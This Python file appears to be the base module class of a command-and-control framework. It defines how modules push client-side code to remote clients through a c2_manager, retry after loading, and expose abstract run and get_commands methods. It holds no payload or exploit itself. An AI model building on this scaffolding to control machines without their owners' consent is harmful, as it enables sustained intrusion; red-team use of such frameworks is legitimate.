import random
import string

METHOD_NOT_IMPLEMENTED_EXCEPTION = 'Method not implemented. Please implement it in order to use the module.'


class ClientModuleNotLoaded(Exception):
    CLIENT_ERROR_CODE_MODULE_NOT_FOUND = 404
    CLIENT_ERROR_CODE_MODULE_ALREADY_EXISTS = 500
    CLIENT_SUCCESS_CODE_MODULE_LOADED = 200

    def __init__(self, client_id, module_name, client_type):
        super(ClientModuleNotLoaded, self).__init__()
        self.client_id = client_id
        self.module_name = module_name
        self.client_type = client_type


class BaseModule:
    # Module name, overwrite it in the implementation
    MODULE_NAME = 'MODULE_NAME'

    # Modules can access c2_manager and use his methods to manage c2
    c2_manager = None

    # Parameters set by c2 master in creation time.
    parameters = {}

    def start(self, command, load_module_in_client_if_fail=True):
        try:
            self.run(command)
        except ClientModuleNotLoaded as error:
            response = self.c2_manager.load_module_in_client(error.client_id, self.MODULE_NAME, self.get_client_code(error.client_type))
            if load_module_in_client_if_fail and 'status' in response:
                if response['status'] == ClientModuleNotLoaded.CLIENT_SUCCESS_CODE_MODULE_LOADED:
                    self.start(command, load_module_in_client_if_fail=False)
                else:
                    try:
                        print('[!] Error installing module in client "{}":\n\t{}'.format(error.client_id, response['message']))
                    except:
                        print(response)
        except Exception as e:
            raise e

    # Method called when master wants to send the code that the client should execute when
    # module calls the service created with module
    def get_client_code(self, client_type):
        raise Exception(METHOD_NOT_IMPLEMENTED_EXCEPTION)

    # Method called when master runs the module with the given command
    def run(self, command):
        raise Exception(METHOD_NOT_IMPLEMENTED_EXCEPTION)

    #
    @staticmethod

    def get_commands() -> [[str]]:
        raise Exception(METHOD_NOT_IMPLEMENTED_EXCEPTION)
